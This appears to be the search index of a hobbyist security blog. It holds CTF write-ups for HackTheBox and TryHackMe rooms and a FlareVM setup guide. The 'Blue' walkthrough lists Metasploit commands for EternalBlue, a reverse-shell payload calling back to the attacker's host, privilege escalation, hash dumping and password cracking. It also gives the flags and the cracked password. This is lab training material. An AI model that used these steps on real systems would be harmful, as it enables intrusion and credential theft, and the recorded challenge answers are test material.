[[{"l":"Home","p":["Homepage"]}],[{"l":"HackTheBox","p":["Rooms:","Name","Category","Difficulty","Behind the Scenes","Reversing","Very Easy"]}],[{"l":"Behind the Scenes","p":["After struggling to secure our secret strings for a long time, we finally figured out the solution to our problem: Make decompilation harder. It should now be impossible to figure out how our programs work!"]},{"l":"Writeup","p":["Start by downloading the file Behind the Scenes.zip from the HackTheBox challenge onto your Kali Linux guest system. The first thing we do is running the code and see what happens.","We can determine it expects us to pass through a password argument. The next step is to verify what information the strings command reveals.","Now we learned the flag should be HTB{%s} where the value for %s is still unknown. Let's see if ltrace gives us more insights.","We receive a SIGILL, which is a signal that the program tried to execute an illegal instruction. I'd like to see the program in hexeditor to reveal more information.","Let's search in the hexeditor by pressing CTRL+ W and search for text string challenge, the argument we found in the first step. It looks like this reveals our password and HackTheBox flag.","HTB{Itz_0nLy_UD2}","Congratiulations, you've completed the room."]}],[{"l":"TryHackMe","p":["Rooms:","Name","Category","Difficulty","Blue","Exploit","Easy"]}],[{"l":"Blue","p":["Deploy & hack into a Windows machine, leveraging common misconfigurations issues. The Blue CTF is an easy box based on the EternalBlue vulnerability CVE-2017-0143. As preparation for this room, I recommend following the Windows Exploration Basics path to get familair with the commands:","Windows Fundamentals 1 Windows Fundamentals 2 Active Directory Basics Metasploit: Introduction Metasploit: Exploitation Metasploit: Meterpreter"]},{"l":"Writeup"},{"l":"Reconnaissance","p":["How many ports are open with a port number under 1000?","To answer this question I used nmap to scan for open ports and vulnerabilities.","-sV enumerate versions","-p 1-999 scan all ports under 1000","--script vuln argument to scan vulnerabilities","3","What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)","Review the nmap output for the answer to this question.","ms17-010"]},{"l":"Gain Access","p":["Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)","Start Metasploit with the msfconsole command in your terminal. Once Metasploit Framework is initialized, we can search the vulnaribility with command: search ms17-010.","In this case I'm interested in the EternalBlue exploit. Use the command use 0 to select the exploit. You can also use the full name of the exploit with command use exploit/windows/smb/ms17_010_eternalblue.","exploit/windows/smb/ms17_010_eternalblue","Show options and set the one required value. What is the name of this value? (All caps for submission)","After selecting the exploit we can show the module options with the command show options. Analyze the output of this command. There is one required setting that's not predefined.","RHOSTS","Before we run the exploit, we first select a payload and some options. To find your IP address run the ifconfig command and look for the tun0 interface.","set payload windows/x64/shell/reverse_tcp","set RHOSTS SERVER IP ADDRESS","set LHOST YOUR IP ADDRESS","With that done, run the exploit. You can run the exploit with either the run or exploit command.","Exploit is running","The exploit is running successfully if you see the Windows shell: C:\\Windows\\system32."]},{"l":"Privilege Escalation","p":["If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)","Background the shell now with CTRL+ Z.","use post/multi/manage/shell_to_meterpreter","Select this (use MODULE_PATH). Show options, what option are we required to change?","Type in the command use post/multi/manage/shell_to_meterpreter. Now use show options to list the arguments. What option is required but not set?","SESSION","Now type sessions in your terminal. Set the session with command set SESSION SESSION_ID.","Run the post exploit using command run. If it doesn't work the first time, run the exploit again.","This will create a second session. Type in sessions to list them both. Note that session 2 is the meterpreter session.","To get in the meterpreter session use the command sessions SESSION_ID. Now run the getsystem command to verify if we successfully escalated our privileges to NT AUTHORITY\\SYSTEM.","Now run the ps command to list all the running processes on the traget machine.","Running processes on target machine","Migrate a process that is running under NT AUTHORITY\\SYSTEM with the command migrate [pid]. It case it fails, chose another process id."]},{"l":"Cracking","p":["Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?","Run the hashdump command within the meterpreter session.","Jon","Copy this password hash to a file and research how to crack it. What is the cracked password?","Copy the hash ffb43f0de35be4d9917ac0cc8ad57f8d into CrackStation to reveal the password, or use John the Ripper: john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt. Create a text-file with the hash.","alqfna22"]},{"i":"find-flags","l":"Find Flags!","p":["Background the meterpreter session with command background and start the shell session with command sessions SESSION_ID.","Flag1? This flag can be found at the system root.","Change directory to C:\\ and run the dir command.","Use the command type flag1.txt to print the content of the file to your terminal.","flag{access_the_machine}","Flag2? This flag can be found at the location where passwords are stored within Windows.","The command dir *flag*.* /s will reveal the location of where the flags are stored.","type C:\\Windows\\System32\\config\\flag2.txt","flag{sam_database_elevated_access}","Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.","type C:\\Users\\Jon\\Documents\\flag3.txt","flag{admin_documents_can_be_valuable}","Congratiulations, you've completed the room."]}],[{"l":"Pickle Rick","p":["This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. As preparation for this room, I recommend following the Web Hacking Fundamentals path to get familair with the commands:","How websites work HTTP in detail Burp Suite: The Basics OWASP Top 10 OWASP Juice Shop Upload Vulnerabilities"]},{"l":"Writeup"},{"l":"Enumeration","p":["What is the first ingredient Rick needs?","First step is to start with enumeration. Let's start with a nmap scan on the IP-address of the webserver: nmap -A 10.10.92.155 -Pn.","The nmap scan gives us some information. There are 2 open ports: 22 (SSH) and 80 (HTTP). The webserver runs on Apache 2.4.18. Let's open the webpage in our browser to investigate it a little more.","Homepage of the website","No useful data visible on the homepage. What if we view the page source?","Page source of the website","We see the developer made a HTML comment between the !-- -- tags. Now we know the username, but how can we use it? The homepage looks like a static webpage without a login form. Let's dig in a little further.","mr. meeseek hair","Congratiulations, you've completed the room."]}],[{"l":"FlareVM","p":["FlareVM is a reverse engineering and malware analysis distribution on Windows platform created by Mandiant. It includes a lot of tools for security researchers. In this post I'll explain how to install a FlareVM on a clean Windows 11 installation."]},{"l":"Installation"},{"l":"Requirements","p":["60 GB Hard Drive","2 GB RAM"]},{"l":"Windows 11 Installation"},{"l":"Pre-installation","p":["Make sure a clean Windows 11 VM is already installed","Disable Windows Defender","Make sure the following settings are configured:","Disable real-time protection","Disable cloud-delivered protection","Disable automatic sample submission","Add the directory C:\\ to the exclusion list","Take a snapshot of your VM"]},{"i":"installation-1","l":"Installation","p":["Download and copy install.ps1 onto your new VM","Open PowerShell as an Administrator","Unblock the install file by running:","Unblock-File .\\install.ps1","Enable script execution by running:","Set-ExecutionPolicy Unrestricted","Finally, execute the installer script as follow:",".\\install.ps1","You can also pass your password as an argument: .\\install.ps1 -password password"]},{"l":"Post-installation","p":["If the background was not successfully set:","Navigate to %PROGRAMDATA%\\chocolatey\\lib\\flarevm.win10.config.flare\\tools and right click flarevm.png","Right click flarevm.png and select Set as desktop background","Take a post-installation snapshot","Don't forget to update your VM's network settings to Host-Only so that vulnerable programs cannot hop to your host system.","Mandiant FlareVM GitHub"]},{"l":"Updates","p":["In order to install updates, make sure you update your VM's network settings to NAT to restore your internet connection.","You can customize your distribution by installing additional packages. For an overview of all available packages, check the repository on Chocolatey. For example, to install Google Chrome, use the following command:","It's also important to keep your distribution up-to-date. Use the following command to update your installed packages:"]}],[{"l":"LaTeX","p":["Rooms:","Name","Category","Difficulty","Test","Exploit","Easy"]}]]